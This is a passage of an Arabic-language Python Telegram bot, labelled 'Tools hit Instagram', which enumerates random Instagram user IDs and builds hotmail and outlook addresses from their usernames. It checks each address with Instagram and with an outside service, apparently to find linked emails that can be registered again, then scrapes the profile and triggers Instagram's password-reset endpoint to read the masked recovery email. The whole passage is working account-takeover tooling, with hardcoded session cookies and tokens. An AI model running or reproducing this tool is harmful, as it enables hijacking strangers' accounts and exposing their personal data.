					os.system('cls'if os.name=='net'else'clear')
					xy+=1
					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			else:
				n1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

			try:
				if addd == addad:
					key = types.InlineKeyboardMarkup()
					bot.send_message(message.chat.id, f"<strong>لـقد انـتهى فـحص الـسته</strong>",parse_mode="html",reply_markup=key)
					print('لقـد انتهاء فحص السته')
			except:
				pass
def k13(message):
	global y1,y2,xy,zy1,n1
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>تـم لقـد بـدأ الفحـص رجـع لبـايثون</strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>الـنوع /انسـتكرام/عشـوائي/هـوتميل</strong>",parse_mode="html",reply_markup=key)
	os.system('clear')
	while True:
		addad+=1
		zzoy+=1
		zan=int("".join(random.choice('67')for i in range(1)));re="".join(random.choice('1234567890')for i in range(zan));url = f'http://i.instagram.com/api/v1/users/{re}/info/';headers = {
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
'Accept-Language': 'en-IQ, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
};rr = requests.get(url,headers=headers).text
		if 'User not found' in rr:
			pass
		else:
			rre=json.loads(rr)
			email = rre['user']['username']+'@hotmail.com'
			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
	'email':f'{email}'
	}
			try:
				r= requests.post(url,headers=head,data=data).text
			except:
				continue
			if 'email_is_taken' in r:	
				y1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
				try:
					rr = requests.post(f'https://hotmail5-916bc4f56aa2.herokuapp.com/zaid/?email={email}').text
				except:
					continue 
				if 'good' in rr:
				  zy1+=1
				  os.system('cls'if os.name=='net'else'clear')
				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				  user=email.split('@')[0]
				  try:
					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
					  he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	}
	
					  re =requests.get(urlg, headers=he).json()
					  io = re['data']['user']['biography']
					  fol = re['data']['user']['edge_followed_by']['count']
					  fos = re['data']['user']['edge_follow']['count']
					  ido = re['data']['user']['id']
					  nam = re['data']['user']['full_name']
					  isp = re['data']['user']['is_private']
					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
					  try:
					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
					  	date = ree["date"]
					  except:
					  	date="No Date"
					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
					  he = {
	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
	'Cookie2': '$Version=1',
	'Accept-Language': 'ar-EG, en-US',
	'X-IG-Connection-Type': 'MOBILE(LTE)',
	'X-IG-Capabilities': 'AQ==',
	'Accept-Encoding': 'gzip',
	}
					  data = {
	"user_id":ido,"device_id":str(uuid4()),
	}
					  try:
					  	zaid = requests.post(url,headers=he, data=data).json()
					  	rest = zaid["obfuscated_email"]
					  except:
					  	rest='No Rest'
					  ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
				  except:
				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
				else:
					os.system('cls'if os.name=='net'else'clear')
					xy+=1
					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			else:
				n1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

def k14(message):
	global y1,y2,xy,zy1,n1
	iid = str(message.from_user.id)
	aol1=0
	face1=0
	face2=0
	aol2=0
	eerr=0
	zzoy=0
	addad=0
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>تـم لقـد بـدأ الفحـص رجـع لبـايثون</strong>",parse_mode="html",reply_markup=key)
	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>الـنوع /انسـتكرام/عشـوائي/اوتـلوك</strong>",parse_mode="html",reply_markup=key)
	os.system('clear')
	while True:
		addad+=1
		zzoy+=1
		zan=int("".join(random.choice('67')for i in range(1)));re="".join(random.choice('1234567890')for i in range(zan));url = f'http://i.instagram.com/api/v1/users/{re}/info/';headers = {
'Host': 'i.instagram.com',
'Connection': 'Keep-Alive',
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
'Accept-Language': 'en-IQ, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
};rr = requests.get(url,headers=headers).text
		if 'User not found' in rr:
			pass
		else:
			rre=json.loads(rr)
			email = rre['user']['username']+'@outlook.com'
			url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
			head= {	
		 'Host': 'www.instagram.com',
		 'origin': 'https://www.instagram.com',
		 'referer': 'https://www.instagram.com/accounts/signup/email/',	
		 'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
		 'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',};data = {
	'email':f'{email}'
	}
			try:
				r= requests.post(url,headers=head,data=data).text
			except:
				continue
			if 'email_is_taken' in r:	
				y1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')	
				try:
					rr = requests.post(f'https://hotmail5-916bc4f56aa2.herokuapp.com/zaid/?email={email}').text
				except:
					continue 
				if 'good' in rr:
				  zy1+=1
				  os.system('cls'if os.name=='net'else'clear')
				  print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				  user=email.split('@')[0]
				  try:
					  urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
					  he = {
	'accept': '*/*',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar',
	'cookie': 'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 \05454664153777\0541693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6\054546641 53777\0541693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc',
	'origin': 'https://www.instagram.com',
	'referer': 'https://www.instagram.com/',
	'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-site',
	'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
	'x-asbd-id': '198387',
	'x-csrftoken': 'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc',
	'x-ig-app-id': '936619743392459',
	'x-ig-www-claim': '0',
	}
	
					  re =requests.get(urlg, headers=he).json()
					  io = re['data']['user']['biography']
					  fol = re['data']['user']['edge_followed_by']['count']
					  fos = re['data']['user']['edge_follow']['count']
					  ido = re['data']['user']['id']
					  nam = re['data']['user']['full_name']
					  isp = re['data']['user']['is_private']
					  op = re['data']['user']['edge_owner_to_timeline_media']['count']
					  try:
					  	ree = requests.get(f'https://o7aa.pythonanywhere.com/?id={ido}').json()
					  	date = ree["date"]
					  except:
					  	date="No Date"
					  url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
					  he = {
	'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
	'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
	'Cookie2': '$Version=1',
	'Accept-Language': 'ar-EG, en-US',
	'X-IG-Connection-Type': 'MOBILE(LTE)',
	'X-IG-Capabilities': 'AQ==',
	'Accept-Encoding': 'gzip',
	}
					  data = {
	"user_id":ido,"device_id":str(uuid4()),
	}
					  try:
					  	zaid = requests.post(url,headers=he, data=data).json()
					  	rest = zaid["obfuscated_email"]
					  except:
					  	rest='No Rest'
					  ff =f'''
🎖═══════════════════
🗣 𝐍𝐀𝐌𝐄 ﴾ {nam} ﴿
🎫 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 ﴾ @{user} ﴿
🗞 𝐈𝐃 ﴾ {ido} ﴿
📧 𝐄𝐌𝐀𝐈𝐋 ﴾ {email} ﴿
🪆 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 ﴾ {fol} ﴿
🎎 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 ﴾ {fos} ﴿
📅 𝐃𝐀𝐓𝐄 ﴾ {date} ﴿
🖼 𝐏𝐎𝐒𝐓𝐒 ﴾ {op} ﴿
🔐 𝐈𝐒𝐏 ﴾ {isp} ﴿
🔭 𝐑𝐄𝐒𝐓 ﴾ {rest} ﴿
🔍 𝐏𝐈𝐎 ﴾ {io} ﴿
🎖═══════════════════
🤴 𝐁𝐘 ﴾ @P_W_7 ﴿'''
					  key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{ff}</strong>",parse_mode="html",reply_markup=key)
				  except:
				  	key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{email}</strong>",parse_mode="html",reply_markup=key)					
				else:
					os.system('cls'if os.name=='net'else'clear')
					xy+=1
					print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			else:
				n1+=1
				os.system('cls'if os.name=='net'else'clear')
				print(f'{X}Tools hit Instagram\n\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{y1}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{n1}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{xy}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{zy1}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
																
def k2(message):
	id = str(message.from_user.id)
	tn=str(message.text)
	if 'حذف' in tn:
		os.system(f'rm -rf usernamezaid{id}.txt')
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>تـم حـذف لسـتاتـك القـديمه</strong>",parse_mode="html",reply_markup=key)
	else:
		key = types.InlineKeyboardMarkup()
		bot.send_message(message.chat.id, f"<strong>لـقد أرسـلت الكـلمه بشـكل خطأ</strong>",parse_mode="html",reply_markup=key)
	
			
@bot.message_handler(commands=["info"])
def inf(message):
    global zzk
    zzk+=1
    zxu = datetime.datetime.now()
    nm = message.from_user.first_name
    id2 = message.from_user.id
    userk = message.from_user.username
    bio = bot.get_chat(message.from_user.id).bio
    
    ttg=f'''
رتبتك هي عضو 🥰 
ـــــــــــــــــــــــــــــــــــــــ
اسم المستخدم : {nm}
يوزر المستخدم : @{userk}
ايدي المستخدم : {id2}
رقم المستخدم  : {zzk}
الوقت : {zxu}
بايو المستخدم : {bio}
ـــــــــــــــــــــــــــــــــــــــ
ـ @P_W_7'''
    key = types.InlineKeyboardMarkup()
    bot.send_message(message.chat.id, f"<strong>{ttg}</strong>",parse_mode="html",reply_markup=key) 	


while True :
    try:
        bot.infinity_polling()
    except:
        print('Error')
